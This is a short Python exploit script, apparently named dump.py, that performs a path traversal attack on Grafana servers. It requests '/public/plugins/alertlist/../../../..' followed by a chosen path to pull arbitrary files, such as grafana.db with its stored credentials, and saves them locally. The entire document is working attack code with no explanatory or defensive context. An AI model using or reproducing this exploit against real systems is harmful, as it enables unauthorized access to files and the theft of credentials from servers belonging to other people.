#!/usr/bin/env python3
import http.client
from urllib.parse import urlparse
import sys

if len(sys.argv) < 3:
    print("Usage: python3 dump.py http://IP:3000 /var/lib/grafana/grafana.db")
    sys.exit(1)

parsed = urlparse(sys.argv[1])
host = parsed.hostname
port = parsed.port or 80

target_file = sys.argv[2]

path = "/public/plugins/alertlist/../../../../../../../../" + target_file.lstrip("/")

conn = http.client.HTTPConnection(host, port, timeout=15)
conn.request("GET", path)

res = conn.getresponse()
data = res.read()

if res.status != 200:
    print(f"[-] HTTP {res.status}")
    sys.exit(1)

out = target_file.split("/")[-1]

with open(out, "wb") as f:
    f.write(data)

print(f"[+] Saved as {out}")
conn.close()
